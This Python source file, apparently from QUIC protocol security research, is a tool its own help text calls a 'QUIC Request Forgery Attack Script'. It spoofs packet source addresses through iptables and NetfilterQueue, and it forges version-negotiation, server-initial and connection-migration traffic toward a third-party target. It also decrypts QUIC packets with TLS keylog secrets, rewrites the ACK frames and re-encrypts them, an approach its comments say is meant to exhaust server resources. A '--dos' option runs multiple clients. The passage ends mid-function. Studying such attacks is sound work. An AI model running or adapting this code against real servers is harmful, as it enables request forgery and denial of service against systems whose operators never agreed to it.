#!/usr/bin/python3

#from concurrent.futures import process
from netfilterqueue import NetfilterQueue
from scapy.all import *
import time
import subprocess
import os
import ssl
import argparse
from argparse import RawTextHelpFormatter
from multiprocessing import Process
import traceback
import pickle
import aioquic

from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h0.connection import H0_ALPN, H0Connection
from aioquic.h3.connection import H3_ALPN, H3Connection
from aioquic.h3.events import (
    DataReceived,
    H3Event,
    HeadersReceived,
    PushPromiseReceived,
)
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import QuicEvent
from aioquic.tls import CipherSuite, SessionTicket
from aioquic.quic.logger import QuicFileLogger
from aioquic.quic.packet import QuicProtocolVersion
from aioquic.buffer import Buffer
from aioquic.quic.packet import pull_quic_header, QuicProtocolVersion, QuicPacketType
from aioquic.quic.crypto import CryptoContext
from aioquic.tls import CipherSuite, TLS_VERSION_1_3, Epoch
import re
import traceback
import minimal_http_client as cl
import vnrf_payload_dns as vp_dns
import shutil


banner = '''
   ____  _    _ _____ _____ ______
  / __ \| |  | |_   _/ ____|  ____|
 | |  | | |  | | | || |    | |__ ___  _ __ __ _  ___
 | |  | | |  | | | || |    |  __/ _ \| '__/ _` |/ _ \\
 | |__| | |__| |_| || |____| | | (_) | | | (_| |  __/
  \___\_\\\\____/|_____\_____|_|  \___/|_|  \__, |\___|
                                           __/ |
                                          |___/
'''

SPOOFED_COUNT = 0
PACKET_COUNT = 0
QUIC_EXPECTED_PACKET_NUMBER = 0
# Iptables Templates
iptables_tmpl = "iptables {action} OUTPUT -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"
# Modified iptables template to handle traffic from other Docker containers
# iptables_tmpl = "iptables {action} FORWARD -d {victim_ip} -p udp --dport {victim_port} -j NFQUEUE --queue-num 1"

# Legacy Lsquic and quicly support, adjust to the correct install path
lsquic_client_tmpl = "/opt/lsquic/bin/http_client -H {host} -s {victim_ip}:{victim_port} -G /home/client/quic/QUICforge/secrets -p {path} -K"
lsquic_client_flag_version = " -o version={version}"    # Set QUIC version
lsquic_client_flag_alpn = " -Q {alpn}"                  # Set ALPN

quicly_client_tmpl = "/home/client/quic/quicly/quicly/cli {victim_ip} {victim_port} -O -p {path} -a {alpn}"

def parse_arguments():

    gen_desc = "QUIC Request Forgery Attack Script"
    parser = argparse.ArgumentParser(description=gen_desc)
    parser._optionals.title = 'Optional Arguments'
    parser._positionals.title = 'Required Arguments'

    #General Options
    optparser = argparse.ArgumentParser(add_help=False)
    optparser.add_argument('victim_ip', help='The victim\'s IP address. The victim is the server the quic connection is established with')
    optparser.add_argument('target_ip', help='The target\'s IP address. The target is the host the forged request is send to')
    optparser.add_argument('--victim_port','-v', help='The vicitm\'s listening port. Default ist 12345', default=12345, type=int)
    optparser.add_argument('--target_port','-t', help='The target\'s listening port', default=0, type=int)
    optparser.add_argument('--path','-p', help='The path to request for http requests', default="/")
    optparser.add_argument('--alpn','-a', help='The ALPN to be used. Defaults are h3-29 for draft-29 and h3 for version 1', default='h3')
    optparser.add_argument('--dos', '-d', help='Number of client processes to be started', type=int, default=1, choices=range(1,21), metavar="[1-22]")
    #optparser.add_argument('--verbose','-v', help='Turn on stdout and stderr for client subprocesses', action='store_true')

    subparsers = parser.add_subparsers(required=True, dest='mode')
    
    #Parser for CMRF
    parser_cm = subparsers.add_parser('cm', help='Connection migration mode', parents=[optparser], description=gen_desc + '\nConnection Migration Mode', formatter_class=RawTextHelpFormatter)
    parser_cm.add_argument('--start_time','-s', help='The time to wait until triggering the connection migration', type=int, default=4)
    parser_cm.add_argument('--limit','-l', help='Limits the amount of spoofed packets (Default: 0 = No limit)', type=int, default=0)
    parser_cm.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
    parser_cm.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    parser_cm.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
    parser_cm._optionals.title = 'Optional Arguments'
    parser_cm._positionals.title = 'Required Arguments'

    #Parser for VNRF
    parser_vn = subparsers.add_parser('vn', help='Version negotiation mode', parents=[optparser], description=gen_desc + '\n Version Negotiation Mode', formatter_class=RawTextHelpFormatter)
    parser_vn.add_argument('--cid_len','-c', help='Length of the CID used in the initial message (currently SCID/DCID are the same length)', choices=range(0,256), metavar="[0-255]", type=int, default=20)
    parser_vn.add_argument('--payload_mode','-M', help='The payload type that is sent with VNRF', default=None, choices=['dns'])
    parser_vn.add_argument('--payload','-P', help='The payload for a VNRF attack. Only works with payload_mode', default="")
    parser_vn._optionals.title = 'Optional Arguments'
    parser_vn._positionals.title = 'Required Arguments'

    #Parser for SIRF
    parser_si = subparsers.add_parser('si', help='Server initial mode', parents=[optparser], description=gen_desc + '\nServer Initial Mode', formatter_class=RawTextHelpFormatter)
    parser_si.add_argument('--legacy', '-e', help='Enables legacy mode with the client specified', default=False, choices=['lsquic', 'quicly'])
    parser_si.add_argument('--host','-H', help='(legacy only) Sets the hostname send as SNI. Default ist www.example.com', default='www.example.com')
    parser_si.add_argument('--version','-V', help='(legacy only) The quic version to be used', choices=['h3-27', 'h3-29', '1'], default='1')
    parser_si._optionals.title = 'Optional Arguments'
    parser_si._positionals.title = 'Required Arguments'

    #Parser for ACKRF
    parser_ack = subparsers.add_parser('ack', help='ACK mode', parents=[optparser], description=gen_desc + '\nACK Mode', formatter_class=RawTextHelpFormatter)
    parser_ack.add_argument('--version','-V', help='The quic version to be used', choices=['1', '2'], default='2')
    parser_ack._optionals.title = 'Optional Arguments'
    parser_ack._positionals.title = 'Required Arguments'

    return parser.parse_args()


def spoof_packet(packet, ip, port=0):
    
    payload = IP(packet.get_payload())
        
    # Set spoofed source address
    old_ip = payload.src
    payload.src = ip

    old_port = payload.sport
    if port != 0:
        payload.sport = port

    # Recalculate checksums for IP and UDP
    del payload[IP].chksum
    del payload[UDP].chksum
    payload = payload.__class__(bytes(payload))
    packet.set_payload(bytes(payload))
    print("[*] {old_ip}:{old_port} -> {ip}:{port}".format(old_ip=old_ip, old_port=old_port, ip=ip, port=(port if port !=0 else old_port)))

    return packet


def connection_migration_callback(packet, starttime=0, args=None):
    global SPOOFED_COUNT
    global PACKET_COUNT
    
    PACKET_COUNT += 1

    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    # Ugly workaround to give enough packets to succeed with handshake
    if PACKET_COUNT > 3:
        packet = spoof_packet(packet, args.target_ip, args.target_port)
        if args.limit != 0:
            SPOOFED_COUNT += 1

    #if time.time()-starttime > args.start_time:
    #    packet = spoof_packet(packet, args.target_ip, args.target_port)
    #    if args.limit != 0:
    #        SPOOFED_COUNT += 1

    packet.accept()
    print("[*] Packet accepted")

def version_negotiation_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        print("Limit: ", args.limit)
        print("SPOOFED_COUNT: ", SPOOFED_COUNT)
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1
    
    packet.accept()
    print("[*] Packet accepted")
    

def server_initial_callback(packet, args=None):
    global SPOOFED_COUNT
    if args.limit != 0 and SPOOFED_COUNT >= args.limit:
        print("Limit: ", args.limit)
        print("SPOOFED_COUNT: ", SPOOFED_COUNT)
        packet.drop()
        print("[!] Limit reached. Dropping packet")
        return

    packet = spoof_packet(packet, args.target_ip, args.target_port)
    if args.limit != 0:
        SPOOFED_COUNT += 1

    packet.accept()
    print("[*] Packet accepted")
    
def load_tls_secrets(keylog_path="./client_secrets.log")-> Tuple[bool, dict, list]:
    """
    Load TLS secrets from a keylog file.
    
    Args:
        keylog_path: Path to the SSL keylog file
        
    Returns:
        Tuple containing (success, secrets_dict, found_secret_lines)
        where secrets_dict contains the loaded secrets and found_secret_lines provides debug info
    """
    import re
    import traceback
    
    # Load all supported secret types from keylog file
    secrets = {
        "CLIENT_HANDSHAKE_TRAFFIC_SECRET": None,
        "SERVER_HANDSHAKE_TRAFFIC_SECRET": None,
        "CLIENT_TRAFFIC_SECRET_0": None,
        "SERVER_TRAFFIC_SECRET_0": None,
        "CLIENT_EARLY_TRAFFIC_SECRET": None  # Added 0-RTT secret
    }
    
    # Track found secret lines to help debug
    found_secret_lines = []
    
    # Check if keylog file exists and readable
    if not os.path.exists(keylog_path):
        print(f"[!] Keylog file '{keylog_path}' does not exist")
        return False, {}, []
    
    if not os.path.getsize(keylog_path):
        print(f"[!] Keylog file '{keylog_path}' is empty")
        return False, {}, []
    
    try:
        with open(keylog_path, "r") as f:
            content = f.read()
            if len(content) < 10:  # Arbitrary small number
                print(f"[!] Keylog file has too little content: '{content}'")
                return False, {}, []
                
            lines = content.splitlines()
            
            
            for line in lines:
                for secret_type in secrets.keys():
                    if secret_type in line:
                        match = re.search(fr'{secret_type}\s+(\w+)\s+(\w+)', line)
                        if match:
                            connection_id = match.group(1)
                            secret_hex = match.group(2)
                            secrets[secret_type] = bytes.fromhex(secret_hex)
                            found_secret_lines.append(f"{secret_type} for connection {connection_id[:8]}...")
                            
    except Exception as e:
        print(f"[!] Keylog file error: {str(e)}")
        traceback.print_exc()
        return False, {}, []
    
    # Check if we have any secrets
    if not any(secrets.values()):
        print(f"[!] No valid secrets found in keylog. Found lines: {found_secret_lines}")
        return False, {}, []
        
    print(f"[*] Successfully loaded {len(found_secret_lines)} secret entries")
    return True, secrets, found_secret_lines

def decrypt_quic_packet(packet, secrets) -> Tuple[bool, list]:
    """
    Decrypt any type of QUIC packet using TLS secrets from a keylog file.
    Handles multiple QUIC packets within a single UDP datagram.
    
    Args:
        packet: NetfilterQueue packet
        keylog_path: Path to the SSL keylog file
        
    Returns:
        Tuple containing (success, list_of_decrypted_packets)
        where list_of_decrypted_packets contains tuples of (header, decrypted_payload, packet_number)
    """
    global QUIC_EXPECTED_PACKET_NUMBER
    
    try:
        
        # Extract the packet payload using scapy
        scapy_packet = IP(packet.get_payload())        
            
        udp = scapy_packet[UDP]
        udp_payload = bytes(udp.payload)
        # Make sure we have a QUIC packet
            
        # print(f"\n[*] Analyzing packet from {scapy_packet.src}:{udp.sport} to {scapy_packet.dst}:{udp.dport}")
        # print(f"[*] UDP payload length: {len(udp_payload)} bytes")
        
        # Define cipher suites to try
        cipher_suite = CipherSuite.AES_256_GCM_SHA384
        # Prepare to scan through multiple QUIC packets in the datagram
        buf = Buffer(data=udp_payload)
        success = False
        parsed_quic_packets = []
        
        # Process all packets in the datagram
        while not buf.eof():
            
            start_off = buf.tell()
            # print(f"[*] QUIC expected packet number: {QUIC_EXPECTED_PACKET_NUMBER}")
            try:
                # Try to parse the QUIC header
                header = pull_quic_header(buf, host_cid_length=20)
            except ValueError as e:
                print(f"[!] Error parsing QUIC header: {str(e)}")
                if parsed_quic_packets:
                    return True, parsed_quic_packets
                else:
                    print("[!] No valid QUIC packets found in datagram")
                    return False, []
            
            QUIC_EXPECTED_PACKET_NUMBER += 1
            # print(f"[*] Header: {header}")
            # print(f"[*] Version: {header.version}")
            # print(f"[*] DCID: {header.destination_cid.hex()}")
            
            # print(f"[*] Packet length: {header.packet_length}")
            # print(f"[*] Packet type: {header.packet_type}")
            # if header.source_cid:
            #     print(f"[*] SCID: {header.source_cid.hex()}")
            
            # Get the encrypted payload offset
            encrypted_offset = buf.tell() - start_off
            
            # For short header packets (1-RTT), adjust the encrypted offset calculation
            if header.packet_type == QuicPacketType.ONE_RTT:
                # Manually calculate the correct offset
                encrypted_offset = 9
            
            end_offset = start_off + header.packet_length
            
            # print(f"[*] Encrypted payload starts at offset: {encrypted_offset}")
            # print(f"[*] Packet data from {start_off} to {end_offset}")
            
            # Select appropriate secrets based on packet type
            client_packet_secrets = []
            server_packet_secrets = []
            if header.packet_type == QuicPacketType.INITIAL:
                print("[*] Initial packets are not encrypted")
                buf.seek(end_offset)
                continue
    
            elif header.packet_type == QuicPacketType.HANDSHAKE:
                # print("[*] Using HANDSHAKE secrets")
                
                if secrets["CLIENT_HANDSHAKE_TRAFFIC_SECRET"]:
                    client_packet_secrets.append(("client_handshake", secrets["CLIENT_HANDSHAKE_TRAFFIC_SECRET"]))
                if secrets["SERVER_HANDSHAKE_TRAFFIC_SECRET"]:
                    server_packet_secrets.append(("server_handshake", secrets["SERVER_HANDSHAKE_TRAFFIC_SECRET"]))
            
            elif header.packet_type == QuicPacketType.ZERO_RTT:
                # print("[*] Using 0-RTT secrets")
                
                if secrets["CLIENT_EARLY_TRAFFIC_SECRET"]:
                    client_packet_secrets.append(("client_0rtt", secrets["CLIENT_EARLY_TRAFFIC_SECRET"]))
            
            elif header.packet_type == QuicPacketType.ONE_RTT:
                # print("[*] Using 1-RTT secrets")
                
                if secrets["CLIENT_TRAFFIC_SECRET_0"]:
                    client_packet_secrets.append(("client_1rtt", secrets["CLIENT_TRAFFIC_SECRET_0"]))
                if secrets["SERVER_TRAFFIC_SECRET_0"]:
                    server_packet_secrets.append(("server_1rtt", secrets["SERVER_TRAFFIC_SECRET_0"]))
            
            # If we don't have appropriate secrets for this packet type, skip it
            if not client_packet_secrets:
                print(f"[!] No appropriate secrets for {header.packet_type} packet")
                # Move to the next packet in the datagram
                buf.seek(end_offset)
                continue
            
            # Try different packet numbers for robustness
            packet_data = udp_payload[start_off:end_offset]
            packet_decrypted = False
            
                    
            for secret_type, secret in client_packet_secrets:
                if packet_decrypted:
                    break
                    
                try:
                    # Set up crypto context
                    crypto = CryptoContext()
                    crypto.setup(
                        cipher_suite=cipher_suite,
                        secret=secret,
                        version=QuicProtocolVersion.VERSION_2
                    )
                    
                    print("[*] Crypto context set successfully")
                    # Try to decrypt
                    plain_header, decrypted_payload, packet_number, key_update = crypto.decrypt_packet(
                        packet=packet_data,
                        encrypted_offset=encrypted_offset,
                        expected_packet_number=QUIC_EXPECTED_PACKET_NUMBER,
                    )
                    
                    # Only consider success if we got a non-empty payload
                    if not decrypted_payload or len(decrypted_payload) == 0:
                        continue
                    
                    print(f"[+] Successfully decrypted with {secret_type} secret using {cipher_suite} (pn={packet_number})")
                    print(f"[*] Decrypted payload length: {len(decrypted_payload)} bytes")
                    # if len(decrypted_payload) > 0:
                    #     print(f"[*] First few bytes: {decrypted_payload[:min(16, len(decrypted_payload))].hex()}")
                    print(f"[*] Packet number vs expected: {packet_number} vs {QUIC_EXPECTED_PACKET_NUMBER}")
                    print(f"[*] Key update: {key_update}")
                    
                    # Add this decrypted packet to our collection
                    parsed_quic_packets.append((header, decrypted_payload, packet_number, start_off, encrypted_offset, end_offset))
                    packet_decrypted = True
                    success = True
                    
                except Exception as e:
                    print(f"[-] Decryption attempt with {secret_type} using {cipher_suite} failed for : {str(e)}")
                    traceback.print_exc()
                    return True, parsed_quic_packets if parsed_quic_packets else (False, [])
            
            # Move to the next packet in the datagram
            buf.seek(end_offset)
        
        if not success:
            print("[!] Could not decrypt any packet in the datagram")
            return False, []
            
        print(f"[+] Successfully decrypted {len(parsed_quic_packets)} QUIC packets from datagram")
        return True, parsed_quic_packets
        
    except Exception as e:
        print(f"[!] Critical error in decrypt_quic_packet: {str(e)}")
        traceback.print_exc()
        return False, []


def reencrypt_quic_packets(packet, secrets, decrypted_packets):
    """
    Re-encrypt already decrypted QUIC packets with modifications.
    This function ensures modifications are preserved while maintaining compatibility.
    """
    try:
        from aioquic.buffer import Buffer
        from aioquic.quic.packet import QuicProtocolVersion, QuicPacketType
        from aioquic.quic.crypto import CryptoContext
        from aioquic.tls import CipherSuite
        import traceback
        
        # Extract the packet payload using scapy
        scapy_packet = IP(packet.get_payload())
        udp = scapy_packet[UDP]
        udp_payload = bytes(udp.payload)
        
        print(f"[*] Re-encrypting {len(decrypted_packets)} QUIC packets")
        print(f"[*] UDP payload buffer size: {len(udp_payload)} bytes")
        
        # Define cipher suite
        cipher_suite = CipherSuite.AES_256_GCM_SHA384
        
        # Create a mutable copy for modifications
        modified_udp_payload = bytearray(udp_payload)
        
        # Process each decrypted packet
        for header, decrypted_payload, packet_number, start_off, encrypted_offset, end_offset in decrypted_packets:
            
            print(f"[*] Re-encrypting packet at offset {start_off}-{end_offset} (encrypted starts at {encrypted_offset})")
            print(f"[*] Packet type: {header.packet_type}, packet number: {packet_number}")
            
            # Select appropriate secret based on packet type
            secret = None
            secret_type = None
            
            if header.packet_type == QuicPacketType.HANDSHAKE:
                if "CLIENT_HANDSHAKE_TRAFFIC_SECRET" in secrets and secrets["CLIENT_HANDSHAKE_TRAFFIC_SECRET"]:
                    secret = secrets["CLIENT_HANDSHAKE_TRAFFIC_SECRET"]
                    secret_type = "client_handshake"
                elif "SERVER_HANDSHAKE_TRAFFIC_SECRET" in secrets and secrets["SERVER_HANDSHAKE_TRAFFIC_SECRET"]:
                    secret = secrets["SERVER_HANDSHAKE_TRAFFIC_SECRET"]
                    secret_type = "server_handshake"
            
            elif header.packet_type == QuicPacketType.ZERO_RTT:
                if "CLIENT_EARLY_TRAFFIC_SECRET" in secrets and secrets["CLIENT_EARLY_TRAFFIC_SECRET"]:
                    secret = secrets["CLIENT_EARLY_TRAFFIC_SECRET"]
                    secret_type = "client_0rtt"
            
            elif header.packet_type == QuicPacketType.ONE_RTT:
                if "CLIENT_TRAFFIC_SECRET_0" in secrets and secrets["CLIENT_TRAFFIC_SECRET_0"]:
                    secret = secrets["CLIENT_TRAFFIC_SECRET_0"]
                    secret_type = "client_1rtt"
                elif "SERVER_TRAFFIC_SECRET_0" in secrets and secrets["SERVER_TRAFFIC_SECRET_0"]:
                    secret = secrets["SERVER_TRAFFIC_SECRET_0"]
                    secret_type = "server_1rtt"
            
            elif header.packet_type == QuicPacketType.INITIAL:
                if "CLIENT_INITIAL_TRAFFIC_SECRET" in secrets and secrets["CLIENT_INITIAL_TRAFFIC_SECRET"]:
                    secret = secrets["CLIENT_INITIAL_TRAFFIC_SECRET"]
                    secret_type = "client_initial"
                elif "SERVER_INITIAL_TRAFFIC_SECRET" in secrets and secrets["SERVER_INITIAL_TRAFFIC_SECRET"]:
                    secret = secrets["SERVER_INITIAL_TRAFFIC_SECRET"]
                    secret_type = "server_initial"
            
            if not secret:
                print(f"[!] No appropriate secret found for {header.packet_type} packet")
                continue
            
            try:
                # Extract original packet data
                original_packet_data = udp_payload[start_off:end_offset]
                original_packet_size = len(original_packet_data)
                
                # Extract the plain header (unencrypted part)
                plain_header = bytes(original_packet_data[:encrypted_offset])
                
                # Set up crypto context
                crypto = CryptoContext()
                crypto.setup(
                    cipher_suite=cipher_suite,
                    secret=secret,
                    version=QuicProtocolVersion.VERSION_2
                )
                
                print(f"[*] Using {secret_type} secret for encryption")
                print(f"[*] Plain header size: {len(plain_header)} bytes")
                print(f"[*] Decrypted payload size: {len(decrypted_payload)} bytes")
                
                # Only skip non-1-RTT packets
                if header.packet_type != QuicPacketType.ONE_RTT:
                    print(f"[*] Using original packet for {header.packet_type} - safer for crypto")
                    encrypted_packet = original_packet_data
                else:
                    # For ONE_RTT packets containing our modified ACKs:
                    # 1. First try: Add padding to decrypted payload before encryption
                    if header.packet_type == QuicPacketType.ONE_RTT:
                        # Try adding PADDING frames (0x00) at the end of decrypted payload
                        modified_payload_with_padding = bytearray(decrypted_payload)
                        # Add two padding bytes
                        modified_payload_with_padding.extend(b'\x00\x00')
                        
                        # Encrypt with padding
                        encrypted_packet = crypto.encrypt_packet(
                            plain_header=plain_header,
                            plain_payload=bytes(modified_payload_with_padding),
                            packet_number=packet_number
                        )
                        
                        # Check if padding created correct size
                        if len(encrypted_packet) == original_packet_size:
                            print(f"[+] Successfully padded payload to match original size")
                        else:
                            # If padding didn't work, try original method
                            encrypted_packet = crypto.encrypt_packet(
                                plain_header=plain_header,
                                plain_payload=bytes(decrypted_payload),
                                packet_number=packet_number
                            )
                    else:
                        # Normal encryption for other packet types
                        encrypted_packet = crypto.encrypt_packet(
                            plain_header=plain_header,
                            plain_payload=bytes(decrypted_payload),
                            packet_number=packet_number
                        )
                    
                    # Step 2: Check for size mismatch - fix with padding if needed
                    if len(encrypted_packet) != original_packet_size:
                        size_diff = original_packet_size - len(encrypted_packet)
                        print(f"[!] Size mismatch: {len(encrypted_packet)} vs {original_packet_size} (diff: {size_diff})")
                        
                        # We need to make a decision here:
                        if size_diff == 2 and len(encrypted_packet) >= 16:  # Common case - 2 byte difference
                            # IMPROVED APPROACH: Insert padding in the protected payload
                            # but preserve the authentication tag
                            auth_tag_size = 16  # Standard AEAD tag size
                            
                            # Split packet into header, payload, and tag
                            header_part = encrypted_packet[:encrypted_offset]
                            payload_part = encrypted_packet[encrypted_offset:-auth_tag_size]
                            auth_tag = encrypted_packet[-auth_tag_size:]
                            
                            # Create version with padding right before auth tag
                            patched_packet = header_part + payload_part + b'\x00\x00' + auth_tag
                            
                            # Check if our patched packet has the right size
                            if len(patched_packet) == original_packet_size:
                                print(f"[+] Successfully patched packet to match original size")
                                encrypted_packet = patched_packet
                            else:
                                # Alternate approach - directly use the protected header from original
                                # and only replace the payload section
                                original_header = original_packet_data[:encrypted_offset]
                                new_payload = encrypted_packet[encrypted_offset:]
                                
                                # If payload is too small, add padding
                                if len(new_payload) < len(original_packet_data) - encrypted_offset:
                                    padding_needed = (len(original_packet_data) - encrypted_offset) - len(new_payload)
                                    # Add padding after payload but before authentication tag
                                    new_payload_with_padding = new_payload[:-auth_tag_size] + (b'\x00' * padding_needed) + new_payload[-auth_tag_size:]
                                    patched_packet = original_header + new_payload_with_padding
                                    
                                    if len(patched_packet) == original_packet_size:
                                        print(f"[+] Successfully padded payload to match original size")
                                        encrypted_packet = patched_packet
                                    else:
                                        print(f"[!] All patching methods failed, using original packet")
                                        encrypted_packet = original_packet_data
                                else:
                                    print(f"[!] Patching failed, using original packet")
                                    encrypted_packet = original_packet_data
                        else:
                            # For other size differences, try to preserve at least the header
                            # This approach maintains header protection
                            print(f"[!] Using hybrid approach - original header with modified payload")
                            
                            # Take header from original packet but payload from our encrypted version
                            if size_diff > 0 and size_diff <= 16:  # Reasonable padding size
                                # Keep header, add padding to payload
                                original_header = original_packet_data[:encrypted_offset]
                                new_payload = encrypted_packet[encrypted_offset:]
                                padding_needed = size_diff
                                
                                # Try to insert padding before auth tag
                                auth_tag_size = 16
                                if len(new_payload) >= auth_tag_size:
                                    padded_payload = new_payload[:-auth_tag_size] + (b'\x00' * padding_needed) + new_payload[-auth_tag_size:]
                                    hybrid_packet = original_header + padded_payload
                                    
                                    if len(hybrid_packet) == original_packet_size:
                                        print(f"[+] Successfully created hybrid packet with padding")
                                        encrypted_packet = hybrid_packet
                                    else:
                                        print(f"[!] Hybrid approach failed, using original packet")
                                        encrypted_packet = original_packet_data
                                else:
                                    print(f"[!] Payload too small for hybrid approach, using original packet")
                                    encrypted_packet = original_packet_data
                            else:
                                print(f"[!] Size difference not patchable, using original packet")
                                encrypted_packet = original_packet_data
                    else:
                        # Check if they have content differences - this is normal with our modifications
                        diff_pos = []
                        for i in range(len(encrypted_packet)):
                            if encrypted_packet[i] != original_packet_data[i]:
                                diff_pos.append(i)
                        
                        print(f"[*] Differences at {len(diff_pos)} positions")
                        
                        # Ensure we're not modifying header protection bits
                        # For ONE_RTT packets, only first byte is protected
                        if 0 in diff_pos:
                            # Fix the header protection bits
                            print(f"[*] Fixing header protection bits")
                            # Replace just the first byte from original
                            encrypted_packet = original_packet_data[0:1] + encrypted_packet[1:]
                
                print(f"[*] Final re-encrypted packet size: {len(encrypted_packet)} bytes")
                
                # Replace the packet data
                modified_udp_payload[start_off:end_offset] = encrypted_packet
                print(f"[+] Successfully re-encrypted packet")
                
            except Exception as e:
                print(f"[-] Encryption failed for {secret_type}: {str(e)}")
                traceback.print_exc()
                # Use original packet data in case of any errors
                modified_udp_payload[start_off:end_offset] = original_packet_data
                continue
        
        # Update the UDP payload
        udp.remove_payload()
        udp.add_payload(Raw(bytes(modified_udp_payload)))
        
        # Recalculate checksums
        del scapy_packet[IP].chksum
        del scapy_packet[IP].len
        del scapy_packet[UDP].chksum
        del scapy_packet[UDP].len
        
        # Rebuild the packet
        scapy_packet = scapy_packet.__class__(bytes(scapy_packet))
        
        # Set the new payload in the NetfilterQueue packet
        packet.set_payload(bytes(scapy_packet))
        
        print(f"[+] Successfully re-encrypted {len(decrypted_packets)} QUIC packets")
        return packet
        
    except Exception as e:
        print(f"[!] Critical error in reencrypt_quic_packets: {str(e)}")
        traceback.print_exc()
        return packet

def spoof_ack_packet(packet, args, modifier_func=None):
    """
    Decrypt a QUIC packet, modify its contents, and re-encrypt it.
    
    Args:
        packet: NetfilterQueue packet
        args: Command line arguments
        modifier_func: Function to modify the decrypted payload
                       Takes (decrypted_payload, header, packet_number) and returns modified_payload
    
    Returns:
        Modified packet
    """
    try:

        tls_success, secrets, found_secret_lines = load_tls_secrets("./client_secrets.log")
        while not tls_success:
            print("[!] Failed to load TLS secrets. Retrying in 5 seconds...")
            time.sleep(5)
            tls_success, secrets, found_secret_lines = load_tls_secrets("./client_secrets.log")
        # First, try to decrypt the packet
        success, decrypted_packets = decrypt_quic_packet(packet, secrets)
        
        if not success:
            print("[!] Failed to decrypt packet for modification")
            return packet
            
        # If we have a modifier function, use it to modify the payload
        if modifier_func:
            modified_payloads = []
            print("[*] Modifying payload with provided modifier function")
            for header, decrypted_payload, packet_number, start_off, encrypted_offset, end_offset in decrypted_packets:
                print(f"[*] Modifying packet with header: {header}")
                modified_payload = modifier_func(decrypted_payload, header, packet_number)
                modified_payloads.append((header, modified_payload, packet_number, start_off, encrypted_offset, end_offset))
            if not modified_payload:
                print("[!] Modifier function returned None or empty payload")
                return packet
        
        else:
            return packet
        
        # Now we need to re-encrypt the modified payload
        # This is where it gets complex - we need the same keys used for decryption
        # For now, we'll skip the re-encryption part since it requires more context
        
        print("[!] Re-encrypting modified packets")
        packet = reencrypt_quic_packets(packet, secrets, modified_payloads)
        return packet
        
    except Exception as e:
        print(f"[!] Error in modify_quic_packet: {e}")
        traceback.print_exc()
        return packet

def modify_ack_frames(decrypted_payload, header, packet_number):
    """
    Parse and modify ACK frames in a QUIC packet to trigger server retransmissions.
    This creates large gaps of unacknowledged packets to exhaust server resources.
    """
    from aioquic.buffer import Buffer, BufferReadError
    from aioquic.quic.packet import QuicFrameType, QuicPacketType
    
    # Skip empty payloads
    if not decrypted_payload or len(decrypted_payload) < 1:
        print("[!] Empty payload, nothing to modify")
        return decrypted_payload
        
    # Only focus on 1-RTT packets for ACK spoofing
    if header.packet_type != QuicPacketType.ONE_RTT:
        print(f"[*] Not modifying {header.packet_type} packet (only targeting 1-RTT)")
        return decrypted_payload
        
    buf = Buffer(data=decrypted_payload)
    modified_frames = bytearray()
    
    # Use the actual decrypted payload length
    original_payload_size = len(decrypted_payload)
    print(f"[*] Original payload size: {original_payload_size} bytes")
    
    # Track whether we found and modified any ACK frames
    found_ack = False
    
    try:
        while not buf.eof():
            frame_type = buf.pull_uint_var()
            frame_type_size = len(_encode_uint_var(frame_type))
            
            if frame_type in (QuicFrameType.ACK, QuicFrameType.ACK_ECN):
                found_ack = True
                print(f"[+] Found ACK frame of type {hex(frame_type)}")
                
                # Store the current position to calculate frame size
                frame_start_pos = buf.tell() - frame_type_size
                
                # Parse ACK frame completely first
                largest_acked = buf.pull_uint_var()
                ack_delay = buf.pull_uint_var()
                ack_range_count = buf.pull_uint_var()
                first_ack_range = buf.pull_uint_var()
                
                print(f"[*] ORIGINAL ACK: largest_acked={largest_acked}, ack_delay={ack_delay}, range_count={ack_range_count}, first_range={first_ack_range}")
                
                # Read and store all original ACK ranges
                original_ranges = []
                for i in range(ack_range_count):
                    if not buf.eof():
                        gap = buf.pull_uint_var()
                        ack_range_length = buf.pull_uint_var()
                        original_ranges.append((gap, ack_range_length))
                        print(f"[*] Original range {i+1}: gap={gap}, length={ack_range_length}")
                
                # Handle ECN counts if present
                ecn_counts = []
                if frame_type == QuicFrameType.ACK_ECN:
                    ecn_counts = [
                        buf.pull_uint_var(),  # ECT0
                        buf.pull_uint_var(),  # ECT1
                        buf.pull_uint_var()   # ECN_CE
                    ]
                
                # Calculate the size of the original ACK frame
                frame_end_pos = buf.tell()
                original_frame_size = frame_end_pos - frame_start_pos
                
                print(f"[*] Original ACK frame size: {original_frame_size} bytes")
                
                # Create a new ACK frame with the same size
                temp_buf = Buffer(capacity=original_frame_size)
                
                # Write frame type
                temp_buf.push_uint_var(frame_type)
                
                # ATTACK STRATEGY:
                # 1. Set largest_acked to a very low number (1 or 2)
                # 2. Set first_range to 0 (acknowledge only one packet)
                # 3. Create range entries with massive gaps
                
                # Keep only the lowest packets acknowledged
                modified_largest_acked = 1
                
                # Acknowledge only a single packet at this range
                modified_first_ack_range = 0
                
                # Keep ack_delay the same
                modified_ack_delay = ack_delay
                
                print(f"[*] MODIFIED ACK: largest_acked={modified_largest_acked} (-{largest_acked-modified_largest_acked}), " +
                      f"ack_delay={modified_ack_delay}, first_range={modified_first_ack_range} (-{first_ack_range-modified_first_ack_range})")
                
                # Write modified values
                temp_buf.push_uint_var(modified_largest_acked)
                temp_buf.push_uint_var(modified_ack_delay)
                
                # Calculate how many ranges we can fit
                # Precalculate fixed fields
                fixed_fields = len(_encode_uint_var(modified_largest_acked)) + len(_encode_uint_var(modified_ack_delay))
                fixed_fields += len(_encode_uint_var(0))  # Placeholder for range_count
                fixed_fields += len(_encode_uint_var(modified_first_ack_range))
                
                # Add ECN size if needed
                ecn_size = 0
                if frame_type == QuicFrameType.ACK_ECN:
                    for count in ecn_counts:
                        ecn_size += len(_encode_uint_var(count))
                
                # Calculate available space
